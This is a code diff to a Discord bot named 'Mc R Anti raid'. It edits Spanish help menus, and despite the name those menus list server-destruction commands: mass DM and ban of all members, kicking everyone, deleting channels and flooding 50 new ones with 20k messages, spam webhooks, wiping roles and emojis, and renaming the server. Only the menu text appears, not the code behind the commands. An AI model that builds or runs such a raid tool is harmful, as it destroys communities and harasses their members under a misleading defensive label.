@@ -624,8 +624,7 @@ async def ayuda(ctx, subcom: str = None):
             "!dar premium @    -> Autoriza a un usuario para poder reclamar el rango.\n"
             "!quitar premium @ -> Elimina los privilegios de un usuario de forma directa.\n"
             ".premium          -> Comando de reclamo manual para el usuario autorizado.\n"
-            "
-```"
+            "```"
         )
         try: await ctx.send(menu_premium)
         except: pass
@@ -637,19 +636,19 @@ async def ayuda(ctx, subcom: str = None):
         "=== Mc R Anti raid - cmds ===\n"
         "!uptime          -> Muestra el tiempo activo del bot y la latencia.\n"
         "!eje             -> Muestra el estado de ejecuciones del bot en vivo.\n"
-        "!ayuda premium   -> Despliega las herramientas avanzadas de personalización.\n"
-        "!banpro          -> DM Masivo + Ban global utilizando la multimedia asignada.\n"
+        "!ayuda premium   -> Despliega las herramientas avanzadas de premium.\n"
+        "!banpro          -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro         -> Expulsa de inmediato a todos los miembros.\n"
-        "!rD              -> elimina todo, crea canales e inunda con la config actual.\n"
-        "!ccpro           -> elimina canales y crea 50 categorías para colapsar UI.\n"
+        "!rD              -> Elimina todo, crea 50 canales e inunda con 20k mensajes.\n"
+        "!ccpro           -> Elimina canales y crea 50 categorías para colapsar UI.\n"
         "!hookpro         -> Genera webhooks de spam ultra veloz por canal.\n"
         "!nickpro         -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
         "!rnServers       -> Cambia el nombre del servidor a 'Mc R'.\n"
         "!rolesD          -> Destruye todos los roles existentes del servidor.\n"
         "!rolesC          -> Genera 50 roles con colores arcoíris aleatorios.\n"
-        "!emojisD         -> elimina los emojis y stickers personalizados.\n"
-        "
-```"
+        "!emojisD         -> Elimina los emojis y stickers personalizados.\n"
+        "============================================\n"
+        "```"
     )
     try: await ctx.send(menu_general)
     except: pass
